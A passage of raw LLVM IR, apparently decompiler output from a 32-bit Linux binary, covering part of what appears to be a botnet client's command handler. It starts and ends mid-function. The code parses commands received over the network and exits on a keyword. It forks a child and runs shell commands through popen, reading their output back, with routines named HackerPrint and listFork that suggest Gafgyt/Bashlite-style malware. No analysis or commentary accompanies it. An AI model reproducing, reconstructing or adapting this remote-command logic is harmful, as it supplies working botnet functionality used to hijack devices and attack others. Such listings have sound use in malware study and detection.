  %v2_8051804 = call i32 @__GI_inet_ntoa(i32 %v0_80517fc)
  %v0_8051809 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_8051809 = ptrtoint i8* %v0_8051809 to i32
  store i8* %v0_8051809, i8** %stack_var_-5376, align 4
  %v4_805182a = call i32 @HackerPrint(i32 %v1_8051809, i32 ptrtoint (i32* @global_var_805ba6c.472 to i32))
  br label %dec_label_pc_8051e4c

dec_label_pc_805184e:                             ; preds = %dec_label_pc_8051a3f, %dec_label_pc_80519f7
  %v2_8051851 = mul i32 %storemerge17, 4
  %v9_8051851 = and i32 %storemerge17, 1073741824
  %v10_8051851 = icmp ne i32 %v9_8051851, 0
  store i1 %v10_8051851, i1* %cf.global-to-local, align 1
  %v0_8051856 = load i32, i32* @global_var_8064714.25, align 4
  %v2_805185b = add i32 %v0_8051856, %v2_8051851
  %v1_805185e = inttoptr i32 %v2_805185b to i32*
  %v2_805185e = load i32, i32* %v1_805185e, align 4
  %v4_8051870 = inttoptr i32 %v2_805185e to i8*
  store i8* %v4_8051870, i8** %stack_var_-5376, align 4
  %v6_8051873 = call i32 @__libc_waitpid(i32 %v2_805185e, i32 0, i32 1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp101 = icmp slt i32 %v6_8051873, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp101, label %dec_label_pc_80519f4, label %dec_label_pc_8051880

dec_label_pc_8051880:                             ; preds = %dec_label_pc_805184e
  br label %dec_label_pc_80518b3

dec_label_pc_8051889:                             ; preds = %dec_label_pc_80518b3, %dec_label_pc_80518ed
  %v2_805188c = mul i32 %storemerge19, 4
  %v0_8051891 = load i32, i32* @global_var_8064714.25, align 4
  %v2_8051896 = add i32 %v0_8051891, %v2_805188c
  %v1_8051899 = add i32 %v2_8051896, -4
  %v1_80518ac = inttoptr i32 %v2_8051896 to i32*
  %v2_80518ac = load i32, i32* %v1_80518ac, align 4
  %v2_80518ae = inttoptr i32 %v1_8051899 to i32*
  store i32 %v2_80518ac, i32* %v2_80518ae, align 4
  %v4_80518b0 = add i32 %storemerge19, 1
  br label %dec_label_pc_80518b3

dec_label_pc_80518b3:                             ; preds = %dec_label_pc_8051880, %dec_label_pc_8051889
  %storemerge19 = phi i32 [ %v4_80518b0, %dec_label_pc_8051889 ], [ %.pre, %dec_label_pc_8051880 ]
  %v0_80518c7 = load i32, i32* @global_var_805e488.23, align 8
  %v0_80518cd = load i32, i32* @global_var_805e48c.24, align 4
  %v10_80518e5 = icmp eq i32 %v0_80518cd, 0
  br i1 %v10_80518e5, label %dec_label_pc_80518ed, label %dec_label_pc_8051889

dec_label_pc_80518ed:                             ; preds = %dec_label_pc_80518b3
  store i32 0, i32* @esi, align 4
  store i32 %v0_80518c7, i32* @edi, align 4
  %v10_8051901 = icmp ult i32 %storemerge19, %v0_80518c7
  br i1 %v10_8051901, label %dec_label_pc_8051889, label %dec_label_pc_8051909

dec_label_pc_8051909:                             ; preds = %dec_label_pc_80518ed
  %v2_805190c = mul i32 %storemerge19, 4
  %v0_8051911 = load i32, i32* @global_var_8064714.25, align 4
  %v2_8051916 = add i32 %v2_805190c, -4
  %v1_8051919 = add i32 %v2_8051916, %v0_8051911
  %v1_805191c = inttoptr i32 %v1_8051919 to i32*
  store i32 0, i32* %v1_805191c, align 4
  %v0_8051922 = load i32, i32* @global_var_805e488.23, align 8
  %v0_8051927 = load i32, i32* @global_var_805e48c.24, align 4
  %v1_805192d = add i32 %v0_8051922, -1
  %v4_805192d = icmp ne i32 %v0_8051922, 0
  %v2_8051930 = zext i1 %v4_805192d to i32
  %v3_8051930 = add i32 %v0_8051927, -1
  %v4_8051930 = add i32 %v3_8051930, %v2_8051930
  store i32 %v1_805192d, i32* @global_var_805e488.23, align 8
  store i32 %v4_8051930, i32* @global_var_805e48c.24, align 4
  %v2_805194d = mul i32 %v1_805192d, 4
  %v1_8051950 = add i32 %v2_805194d, 4
  %v5_8051950 = icmp eq i32 %v2_805194d, -4
  store i1 %v5_8051950, i1* %cf.global-to-local, align 1
  %v4_8051953 = inttoptr i32 %v1_8051950 to i8*
  store i8* %v4_8051953, i8** %stack_var_-5376, align 4
  %v2_8051956 = call i32 @malloc(i32 %v1_8051950)
  br label %dec_label_pc_8051989

dec_label_pc_8051967:                             ; preds = %dec_label_pc_8051989, %dec_label_pc_80519c3
  %v2_805196a = mul i32 %storemerge18, 4
  %v5_805196f = add i32 %v2_805196a, %v2_8051956
  %v0_805197a = load i32, i32* @global_var_8064714.25, align 4
  %v2_805197f = add i32 %v0_805197a, %v2_805196a
  %v1_8051982 = inttoptr i32 %v2_805197f to i32*
  %v2_8051982 = load i32, i32* %v1_8051982, align 4
  %v2_8051984 = inttoptr i32 %v5_805196f to i32*
  store i32 %v2_8051982, i32* %v2_8051984, align 4
  %v4_8051986 = add i32 %storemerge18, 1
  br label %dec_label_pc_8051989

dec_label_pc_8051989:                             ; preds = %dec_label_pc_8051909, %dec_label_pc_8051967
  %storemerge18 = phi i32 [ %v4_8051986, %dec_label_pc_8051967 ], [ 0, %dec_label_pc_8051909 ]
  %v0_805199d = load i32, i32* @global_var_805e488.23, align 8
  %v0_80519a3 = load i32, i32* @global_var_805e48c.24, align 4
  %v10_80519bb = icmp eq i32 %v0_80519a3, 0
  br i1 %v10_80519bb, label %dec_label_pc_80519c3, label %dec_label_pc_8051967

dec_label_pc_80519c3:                             ; preds = %dec_label_pc_8051989
  store i32 0, i32* @esi, align 4
  store i32 %v0_805199d, i32* @edi, align 4
  %v10_80519d7 = icmp ult i32 %storemerge18, %v0_805199d
  br i1 %v10_80519d7, label %dec_label_pc_8051967, label %dec_label_pc_80519df

dec_label_pc_80519df:                             ; preds = %dec_label_pc_80519c3
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_80519df = load i32, i32* @global_var_8064714.25, align 4
  %v4_80519e4 = inttoptr i32 %v0_80519df to i8*
  store i8* %v4_80519e4, i8** %stack_var_-5376, align 4
  %v2_80519e7 = call i32 @free(i32 %v0_80519df)
  store i32 %v2_8051956, i32* @global_var_8064714.25, align 4
  br label %dec_label_pc_80519f4

dec_label_pc_80519f4:                             ; preds = %dec_label_pc_805184e, %dec_label_pc_80519df
  br label %dec_label_pc_80519f7

dec_label_pc_80519f7:                             ; preds = %dec_label_pc_8051e4c, %dec_label_pc_80519f4
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_80519f4 ], [ 0, %dec_label_pc_8051e4c ]
  %v1_8051a00 = ashr i32 %storemerge17, 31
  %v0_8051a07 = load i32, i32* @global_var_805e488.23, align 8
  store i32 %v0_8051a07, i32* @esi, align 4
  %v0_8051a0d = load i32, i32* @global_var_805e48c.24, align 4
  store i32 %v0_8051a0d, i32* @edi, align 4
  %v10_8051a25 = icmp ult i32 %v1_8051a00, %v0_8051a0d
  store i1 %v10_8051a25, i1* %cf.global-to-local, align 1
  br i1 %v10_8051a25, label %dec_label_pc_805184e, label %dec_label_pc_8051a31

dec_label_pc_8051a31:                             ; preds = %dec_label_pc_80519f7
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_8051a3d = icmp ugt i32 %v1_8051a00, %v0_8051a0d
  br i1 %v6_8051a3d, label %dec_label_pc_8051a51, label %dec_label_pc_8051a3f

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a31
  %v10_8051a45 = icmp ult i32 %storemerge17, %v0_8051a07
  store i1 %v10_8051a45, i1* %cf.global-to-local, align 1
  br i1 %v10_8051a45, label %dec_label_pc_805184e, label %dec_label_pc_8051a51

dec_label_pc_8051a51:                             ; preds = %dec_label_pc_8051a3f, %dec_label_pc_8051a31
  %v0_8051a54 = load i32, i32* @ebp, align 4
  %v2_8051a54 = add i32 %v7_8051e67, -5244
  %v3_8051a54 = add i32 %v2_8051a54, %v0_8051a54
  %v4_8051a54 = inttoptr i32 %v3_8051a54 to i8*
  store i8 0, i8* %v4_8051a54, align 1
  store i8* %tmp98, i8** %stack_var_-5376, align 4
  %v3_8051a65 = call i32 @trim(i8* %tmp98)
  store i8* %tmp98, i8** %stack_var_-5376, align 4
  %v5_8051a7b = call i32 @strstr(i32 %v2_8051e4c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80590d7.21, i32 0, i32 0))
  %v7_8051a88 = icmp ult i32 %v5_8051a7b, %v2_8051e4c
  store i1 %v7_8051a88, i1* %cf.global-to-local, align 1
  %v12_8051a88 = icmp eq i32 %v5_8051a7b, %v2_8051e4c
  %v1_8051a8a = icmp eq i1 %v12_8051a88, false
  br i1 %v1_8051a8a, label %dec_label_pc_8051aa6, label %dec_label_pc_8051a8c

dec_label_pc_8051a8c:                             ; preds = %dec_label_pc_8051a51
  %v0_8051a8c = load i8*, i8** @global_var_805e480.20, align 4
  %v1_8051a8c = ptrtoint i8* %v0_8051a8c to i32
  store i8* %v0_8051a8c, i8** %stack_var_-5376, align 4
  %v4_8051a9c = call i32 @HackerPrint(i32 %v1_8051a8c, i32 ptrtoint ([5 x i8]* @global_var_805baae.473 to i32))
  br label %dec_label_pc_8051e4c

dec_label_pc_8051aa6:                             ; preds = %dec_label_pc_8051a51
  store i8* %tmp98, i8** %stack_var_-5376, align 4
  %v5_8051ab7 = call i32 @strstr(i32 %v2_8051e4c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805bab3.474, i32 0, i32 0))
  store i32 %v5_8051ab7, i32* @edx, align 4
  store i32 %v2_8051e4c, i32* @eax, align 4
  %v7_8051ac4 = icmp ult i32 %v5_8051ab7, %v2_8051e4c
  store i1 %v7_8051ac4, i1* %cf.global-to-local, align 1
  %v12_8051ac4 = icmp eq i32 %v5_8051ab7, %v2_8051e4c
  %v1_8051ac6 = icmp eq i1 %v12_8051ac4, false
  br i1 %v1_8051ac6, label %dec_label_pc_8051ad4, label %dec_label_pc_8051ac8

dec_label_pc_8051ac8:                             ; preds = %dec_label_pc_8051aa6
  store i8* null, i8** %stack_var_-5376, align 4
  %v2_8051acf = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8051ad4

dec_label_pc_8051ad4:                             ; preds = %dec_label_pc_8051aa6, %dec_label_pc_8051ac8
  %v2_8051ae0 = load i8, i8* %tmp98, align 4
  %v6_8051ae3 = icmp ult i8 %v2_8051ae0, 33
  store i1 %v6_8051ae3, i1* %cf.global-to-local, align 1
  %v10_8051ae3 = icmp eq i8 %v2_8051ae0, 33
  %v1_8051ae5 = icmp eq i1 %v10_8051ae3, false
  br i1 %v1_8051ae5, label %dec_label_pc_8051e4c, label %dec_label_pc_8051aeb

dec_label_pc_8051aeb:                             ; preds = %dec_label_pc_8051ad4
  %v2_8051afa105 = load i8, i8* %v5_8051b23, align 1
  %v3_8051afd108 = icmp ult i8 %v2_8051afa105, 32
  store i1 %v3_8051afd108, i1* %cf.global-to-local, align 1
  %v7_8051afd112 = icmp eq i8 %v2_8051afa105, 32
  br i1 %v7_8051afd112, label %dec_label_pc_8051b0b, label %dec_label_pc_8051b01

dec_label_pc_8051af4:                             ; preds = %dec_label_pc_8051b01
  %v5_8051af4 = add i32 %storemerge16.in114, 1
  %storemerge16 = inttoptr i32 %v5_8051af4 to i8*
  %v2_8051afa = load i8, i8* %storemerge16, align 1
  %v3_8051afd = icmp ult i8 %v2_8051afa, 32
  store i1 %v3_8051afd, i1* %cf.global-to-local, align 1
  %v7_8051afd = icmp eq i8 %v2_8051afa, 32
  br i1 %v7_8051afd, label %dec_label_pc_8051b0b, label %dec_label_pc_8051b01

dec_label_pc_8051b01:                             ; preds = %dec_label_pc_8051aeb, %dec_label_pc_8051af4
  %storemerge16115 = phi i8* [ %storemerge16, %dec_label_pc_8051af4 ], [ %v5_8051b23, %dec_label_pc_8051aeb ]
  %storemerge16.in114 = phi i32 [ %v5_8051af4, %dec_label_pc_8051af4 ], [ %v1_8051aee, %dec_label_pc_8051aeb ]
  %v2_8051b04 = load i8, i8* %storemerge16115, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051b07 = icmp eq i8 %v2_8051b04, 0
  %v1_8051b09 = icmp eq i1 %v4_8051b07, false
  br i1 %v1_8051b09, label %dec_label_pc_8051af4, label %dec_label_pc_8051b0b

dec_label_pc_8051b0b:                             ; preds = %dec_label_pc_8051af4, %dec_label_pc_8051b01, %dec_label_pc_8051aeb
  %storemerge16.lcssa = phi i8* [ %v5_8051b23, %dec_label_pc_8051aeb ], [ %storemerge16115, %dec_label_pc_8051b01 ], [ %storemerge16, %dec_label_pc_8051af4 ]
  %v2_8051b0e = load i8, i8* %storemerge16.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051b11 = icmp eq i8 %v2_8051b0e, 0
  br i1 %v4_8051b11, label %dec_label_pc_8051e4c, label %dec_label_pc_8051b19

dec_label_pc_8051b19:                             ; preds = %dec_label_pc_8051b0b
  store i8 0, i8* %storemerge16.lcssa, align 1
  %v3_8051b3d = call i32 @_strlen(i8* %v5_8051b23)
  %v6_8051b44 = add i32 %v2_8051e4c, %v3_8051b3d
  %v1_8051b47 = add i32 %v6_8051b44, 2
  %v5_8051b47 = icmp ugt i32 %v6_8051b44, -3
  store i1 %v5_8051b47, i1* %cf.global-to-local, align 1
  %v5_8051b4a = inttoptr i32 %v1_8051b47 to i8*
  br label %dec_label_pc_8051b74

dec_label_pc_8051b4f:                             ; preds = %dec_label_pc_8051b9d, %dec_label_pc_8051b74
  %v3_8051b66 = call i32 @_strlen(i8* %v5_8051b4a)
  %v4_8051b66 = mul i32 %v3_8051b66, -1
  %v1_8051b6c = sub i32 0, %v4_8051b66
  %v6_8051b6d = sub i32 %v1_8051b47, %v4_8051b66
  %v11_8051b6d = icmp ult i32 %v6_8051b6d, %v1_8051b6c
  store i1 %v11_8051b6d, i1* %cf.global-to-local, align 1
  %v1_8051b70 = add i32 %v6_8051b6d, -1
  %v1_8051b71 = inttoptr i32 %v1_8051b70 to i8*
  store i8 0, i8* %v1_8051b71, align 1
  br label %dec_label_pc_8051b74

dec_label_pc_8051b74:                             ; preds = %dec_label_pc_8051b19, %dec_label_pc_8051b4f
  %v3_8051b8b = call i32 @_strlen(i8* %v5_8051b4a)
  %v4_8051b8b = mul i32 %v3_8051b8b, -1
  %v1_8051b91 = sub i32 0, %v4_8051b8b
  %v6_8051b92 = sub i32 %v1_8051b47, %v4_8051b8b
  %v11_8051b92 = icmp ult i32 %v6_8051b92, %v1_8051b91
  store i1 %v11_8051b92, i1* %cf.global-to-local, align 1
  %v1_8051b95 = add i32 %v6_8051b92, -1
  %v1_8051b96 = inttoptr i32 %v1_8051b95 to i8*
  %v2_8051b96 = load i8, i8* %v1_8051b96, align 1
  %v6_8051b99 = icmp ult i8 %v2_8051b96, 10
  store i1 %v6_8051b99, i1* %cf.global-to-local, align 1
  %v10_8051b99 = icmp eq i8 %v2_8051b96, 10
  br i1 %v10_8051b99, label %dec_label_pc_8051b4f, label %dec_label_pc_8051b9d

dec_label_pc_8051b9d:                             ; preds = %dec_label_pc_8051b74
  %v3_8051bb4 = call i32 @_strlen(i8* %v5_8051b4a)
  %v4_8051bb4 = mul i32 %v3_8051bb4, -1
  %v1_8051bba = sub i32 0, %v4_8051bb4
  %v6_8051bbb = sub i32 %v1_8051b47, %v4_8051bb4
  %v11_8051bbb = icmp ult i32 %v6_8051bbb, %v1_8051bba
  store i1 %v11_8051bbb, i1* %cf.global-to-local, align 1
  %v1_8051bbe = add i32 %v6_8051bbb, -1
  %v1_8051bbf = inttoptr i32 %v1_8051bbe to i8*
  %v2_8051bbf = load i8, i8* %v1_8051bbf, align 1
  %v6_8051bc2 = icmp ult i8 %v2_8051bbf, 13
  store i1 %v6_8051bc2, i1* %cf.global-to-local, align 1
  %v10_8051bc2 = icmp eq i8 %v2_8051bbf, 13
  br i1 %v10_8051bc2, label %dec_label_pc_8051b4f, label %dec_label_pc_8051bc6

dec_label_pc_8051bc6:                             ; preds = %dec_label_pc_8051b9d
  %v2_8051bd4120 = load i8, i8* %v5_8051b4a, align 1
  %v3_8051bd7123 = icmp ult i8 %v2_8051bd4120, 32
  store i1 %v3_8051bd7123, i1* %cf.global-to-local, align 1
  %v7_8051bd7127 = icmp eq i8 %v2_8051bd4120, 32
  br i1 %v7_8051bd7127, label %dec_label_pc_8051be5, label %dec_label_pc_8051bdb

dec_label_pc_8051bce:                             ; preds = %dec_label_pc_8051bdb
  %v5_8051bce = add i32 %v4_8051bd1130, 1
  %v22_8051bce = inttoptr i32 %v5_8051bce to i8*
  %v2_8051bd4 = load i8, i8* %v22_8051bce, align 1
  %v3_8051bd7 = icmp ult i8 %v2_8051bd4, 32
  store i1 %v3_8051bd7, i1* %cf.global-to-local, align 1
  %v7_8051bd7 = icmp eq i8 %v2_8051bd4, 32
  br i1 %v7_8051bd7, label %dec_label_pc_8051be5, label %dec_label_pc_8051bdb

dec_label_pc_8051bdb:                             ; preds = %dec_label_pc_8051bc6, %dec_label_pc_8051bce
  %v4_8051bd1130 = phi i32 [ %v5_8051bce, %dec_label_pc_8051bce ], [ %v1_8051b47, %dec_label_pc_8051bc6 ]
  %stack_var_-64.0129 = phi i8* [ %v22_8051bce, %dec_label_pc_8051bce ], [ %v5_8051b4a, %dec_label_pc_8051bc6 ]
  %v2_8051bde = load i8, i8* %stack_var_-64.0129, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051be1 = icmp eq i8 %v2_8051bde, 0
  %v1_8051be3 = icmp eq i1 %v4_8051be1, false
  br i1 %v1_8051be3, label %dec_label_pc_8051bce, label %dec_label_pc_8051be5

dec_label_pc_8051be5:                             ; preds = %dec_label_pc_8051bce, %dec_label_pc_8051bdb, %dec_label_pc_8051bc6
  %stack_var_-64.0.lcssa = phi i8* [ %v5_8051b4a, %dec_label_pc_8051bc6 ], [ %stack_var_-64.0129, %dec_label_pc_8051bdb ], [ %v22_8051bce, %dec_label_pc_8051bce ]
  %v4_8051bd1.lcssa = phi i32 [ %v1_8051b47, %dec_label_pc_8051bc6 ], [ %v4_8051bd1130, %dec_label_pc_8051bdb ], [ %v5_8051bce, %dec_label_pc_8051bce ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_8051beb = add i32 %v4_8051bd1.lcssa, 1
  %v2_8051c14136 = load i8, i8* %v5_8051b4a, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051c17138 = icmp eq i8 %v2_8051c14136, 0
  %v1_8051c19140 = icmp eq i1 %v4_8051c17138, false
  br i1 %v1_8051c19140, label %dec_label_pc_8051bf6, label %dec_label_pc_8051c1b

dec_label_pc_8051bf6:                             ; preds = %dec_label_pc_8051be5, %dec_label_pc_8051bf6
  %storemerge15142 = phi i8* [ %storemerge15, %dec_label_pc_8051bf6 ], [ %v5_8051b4a, %dec_label_pc_8051be5 ]
  %storemerge15.in141 = phi i32 [ %v5_8051c0e, %dec_label_pc_8051bf6 ], [ %v1_8051b47, %dec_label_pc_8051be5 ]
  %v2_8051bf9 = load i8, i8* %storemerge15142, align 1
  %v3_8051bf9 = zext i8 %v2_8051bf9 to i32
  %v4_8051bff = inttoptr i32 %v3_8051bf9 to i8*
  store i8* %v4_8051bff, i8** %stack_var_-5376, align 4
  %v2_8051c02 = call i32 @__GI_toupper(i32 %v3_8051bf9)
  %v1_8051c07 = urem i32 %v2_8051c02, 256
  %v2_8051c07 = load i32, i32* @edx, align 4
  %v3_8051c07 = and i32 %v2_8051c07, -256
  %v4_8051c07 = or i32 %v3_8051c07, %v1_8051c07
  store i32 %v4_8051c07, i32* @edx, align 4
  %v1_8051c0c = trunc i32 %v2_8051c02 to i8
  store i8 %v1_8051c0c, i8* %storemerge15142, align 1
  %v5_8051c0e = add i32 %storemerge15.in141, 1
  %storemerge15 = inttoptr i32 %v5_8051c0e to i8*
  %v2_8051c14 = load i8, i8* %storemerge15, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051c17 = icmp eq i8 %v2_8051c14, 0
  %v1_8051c19 = icmp eq i1 %v4_8051c17, false
  br i1 %v1_8051c19, label %dec_label_pc_8051bf6, label %dec_label_pc_8051c1b

dec_label_pc_8051c1b:                             ; preds = %dec_label_pc_8051bf6, %dec_label_pc_8051be5
  %v22_8051beb = inttoptr i32 %v5_8051beb to i8*
  store i1 false, i1* @df, align 1
  store i32 %v1_8051b47, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805bab7.475 to i32), i32* @edi, align 4
  %v7_8051c4b = call i32 @_strncmp(i8* %v5_8051b4a, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805bab7.475, i32 0, i32 0), i32 5)
  %v8_8051c4b = urem i32 %v7_8051c4b, 2
  %v9_8051c4b = icmp eq i32 %v8_8051c4b, 0
  %v0_8051c4d = load i1, i1* %cf.global-to-local, align 1
  %v2_8051c4d = or i1 %v0_8051c4d, %v9_8051c4b
  %v3_8051c4d = zext i1 %v2_8051c4d to i32
  %v4_8051c4d = load i32, i32* @edx, align 4
  %v5_8051c4d = and i32 %v4_8051c4d, -256
  %v6_8051c4d = or i32 %v3_8051c4d, %v5_8051c4d
  %v7_8051c4d = xor i32 %v6_8051c4d, 1
  store i32 %v7_8051c4d, i32* @edx, align 4
  %v3_8051c53 = and i32 %v7_8051c4b, -256
  %v1_8051c55 = trunc i32 %v7_8051c4d to i8
  %v3_8051c55 = zext i1 %v0_8051c4d to i8
  %v4_8051c55 = sub nsw i8 %v1_8051c55, %v3_8051c55
  %v15_8051c55 = icmp eq i8 %v4_8051c55, 0
  %v20_8051c55 = zext i8 %v4_8051c55 to i32
  %v23_8051c55 = or i32 %v20_8051c55, %v3_8051c53
  store i32 %v23_8051c55, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051c5e = icmp eq i1 %v15_8051c55, false
  br i1 %v1_8051c5e, label %dec_label_pc_8051d3f, label %dec_label_pc_8051c64

dec_label_pc_8051c64:                             ; preds = %dec_label_pc_8051c1b
  %v0_8051c64 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051c69 = icmp eq i32 %v0_8051c64, 0
  %v1_8051c6b = icmp eq i1 %v1_8051c69, false
  br i1 %v1_8051c6b, label %dec_label_pc_8051e4c, label %dec_label_pc_8051c71

dec_label_pc_8051c71:                             ; preds = %dec_label_pc_8051c64
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v7_8051c8d = call i32 @__GI_memset(i8* %tmp100, i32 0, i32 1024)
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v6_8051cab = call i32 @szprintf(i32 %v2_8051c71, i32 ptrtoint ([8 x i8]* @global_var_805babc.476 to i32), i32 %v5_8051beb)
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v5_8051cc2 = call i32 @fdpopen(i32 %v2_8051c71, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805bac4.477, i32 0, i32 0))
  %tmp102 = inttoptr i32 %v5_8051cc2 to i8*
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v6_8051d1f143 = call i32 @fdgets(i32 %v2_8051c71, i32 1024, i32 %v5_8051cc2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051d24144 = icmp eq i32 %v6_8051d1f143, 0
  %v1_8051d26146 = icmp eq i1 %v1_8051d24144, false
  br i1 %v1_8051d26146, label %dec_label_pc_8051ccc, label %dec_label_pc_8051d28

dec_label_pc_8051ccc:                             ; preds = %dec_label_pc_8051c71, %dec_label_pc_8051ccc
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v3_8051cd5 = call i32 @trim(i8* %tmp100)
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v7_8051cf6 = call i32 @__GI_memset(i8* %tmp100, i32 0, i32 1024)
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-5376, align 4
  %v2_8051d02 = call i32 @sleep(i32 1)
  store i8* %tmp100, i8** %stack_var_-5376, align 4
  %v6_8051d1f = call i32 @fdgets(i32 %v2_8051c71, i32 1024, i32 %v5_8051cc2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8051d24 = icmp eq i32 %v6_8051d1f, 0
  %v1_8051d26 = icmp eq i1 %v1_8051d24, false
  br i1 %v1_8051d26, label %dec_label_pc_8051ccc, label %dec_label_pc_8051d28

dec_label_pc_8051d28:                             ; preds = %dec_label_pc_8051ccc, %dec_label_pc_8051c71
  store i8* %tmp102, i8** %stack_var_-5376, align 4
  %v2_8051d2e = call i32 @fdpclose(i32 %v5_8051cc2)
  store i32 %v2_8051d2e, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5376, align 4
  %v2_8051d3a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8051d3f

dec_label_pc_8051d3f:                             ; preds = %dec_label_pc_8051c1b, %dec_label_pc_8051d28
  store i32 %v5_8051beb, i32* @eax, align 4
  store i8* %v22_8051beb, i8** %stack_var_-5376, align 4
  %v4_8051d54 = call i32 @__GI_strtok(i32 %v5_8051beb, i32 ptrtoint (i32* @global_var_805bac6.478 to i32))
  %v5_8051d59 = inttoptr i32 %v4_8051d54 to i8*
  store i8* %v5_8051d59, i8** %stack_var_-36, align 4
  store i32 %v1_8051b47, i32* %stack_var_-132, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8051e0023 = icmp eq i32 %v4_8051d54, 0
  %v1_8051e0430 = icmp eq i1 %v5_8051e0023, false
  br i1 %v1_8051e0430, label %dec_label_pc_8051d67, label %dec_label_pc_8051e0a

dec_label_pc_8051d67:                             ; preds = %dec_label_pc_8051d3f, %dec_label_pc_8051de9
  %v3_8051d74 = phi i8* [ %tmp103, %dec_label_pc_8051de9 ], [ %v5_8051d59, %dec_label_pc_8051d3f ]
  %stack_var_-40.131 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8051de9 ], [ 1, %dec_label_pc_8051d3f ]
  %v2_8051d6a = load i8, i8* %v3_8051d74, align 1
  %v3_8051d6a = zext i8 %v2_8051d6a to i32
  store i32 %v3_8051d6a, i32* @eax, align 4
  %v6_8051d6d = icmp ult i8 %v2_8051d6a, 10
  store i1 %v6_8051d6d, i1* %cf.global-to-local, align 1
  %v10_8051d6d = icmp eq i8 %v2_8051d6a, 10
  br i1 %v10_8051d6d, label %dec_label_pc_8051de9, label %dec_label_pc_8051d71

dec_label_pc_8051d71:                             ; preds = %dec_label_pc_8051d67
  %v4_8051d67 = ptrtoint i8* %v3_8051d74 to i32
  store i32 %stack_var_-40.131, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8051d67, i32* @edi, align 4
  %v3_8051d8b = call i32 @_strlen(i8* %v3_8051d74)
  %v1_8051d8f = add i32 %v3_8051d8b, 1
  %v4_8051d93 = inttoptr i32 %v1_8051d8f to i8*
  store i8* %v4_8051d93, i8** %stack_var_-5376, align 4
  %v2_8051d96 = call i32 @malloc(i32 %v1_8051d8f)
  %v1_8051d9b = load i32, i32* @ebp, align 4
  %v2_8051d9b = load i32, i32* @ebx, align 4
  %v3_8051d9b = mul i32 %v2_8051d9b, 4
  %v4_8051d9b = add i32 %v1_8051d9b, -124
  %v5_8051d9b = add i32 %v4_8051d9b, %v3_8051d9b
  %v6_8051d9b = inttoptr i32 %v5_8051d9b to i32*
  store i32 %v2_8051d96, i32* %v6_8051d9b, align 4
  %v3_8051d9f = load i8*, i8** %stack_var_-36, align 4
  %v4_8051d9f = ptrtoint i8* %v3_8051d9f to i32
  %v3_8051db6 = call i32 @_strlen(i8* %v3_8051d9f)
  %v1_8051dba = add i32 %v3_8051db6, 1
  %v0_8051dc3 = load i32, i32* @ebp, align 4
  %v2_8051dc3 = mul i32 %stack_var_-40.131, 4
  %v3_8051dc3 = add i32 %v2_8051dc3, -124
  %v4_8051dc3 = add i32 %v0_8051dc3, %v3_8051dc3
  %v5_8051dc3 = inttoptr i32 %v4_8051dc3 to i32*
  %v6_8051dc3 = load i32, i32* %v5_8051dc3, align 4
  %v1_8051dc7 = inttoptr i32 %v6_8051dc3 to i8*
  store i32 %v6_8051dc3, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8051dcc = and i32 %v6_8051dc3, -256
  %v5_8051dce = call i8* @_memset(i8* %v1_8051dc7, i32 %v1_8051dcc, i32 %v1_8051dba)
  %v6_8051dce = ptrtoint i8* %v5_8051dce to i32
  store i32 %v6_8051dce, i32* @ecx, align 4
  %v0_8051dd6 = load i32, i32* @ebp, align 4
  %v4_8051dd6 = add i32 %v0_8051dd6, %v3_8051dc3
  %v5_8051dd6 = inttoptr i32 %v4_8051dd6 to i32*
  %v6_8051dd6 = load i32, i32* %v5_8051dd6, align 4
  store i32 %v6_8051dd6, i32* @eax, align 4
  %v4_8051dde = inttoptr i32 %v6_8051dd6 to i8*
  store i8* %v4_8051dde, i8** %stack_var_-5376, align 4
  %v5_8051de1 = call i32 @strcpy(i8* %v4_8051dde, i32 %v4_8051d9f)
  store i32 %v5_8051de1, i32* @eax, align 4
  %v4_8051de6 = add i32 %stack_var_-40.131, 1
  br label %dec_label_pc_8051de9

dec_label_pc_8051de9:                             ; preds = %dec_label_pc_8051d67, %dec_label_pc_8051d71
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.131, %dec_label_pc_8051d67 ], [ %v4_8051de6, %dec_label_pc_8051d71 ]
  store i8* null, i8** %stack_var_-5376, align 4
  %v4_8051df8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805bac6.478 to i32))
  store i32 %v4_8051df8, i32* %tmp99, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8051e00 = icmp eq i32 %v4_8051df8, 0
  %v1_8051e04 = icmp eq i1 %v5_8051e00, false
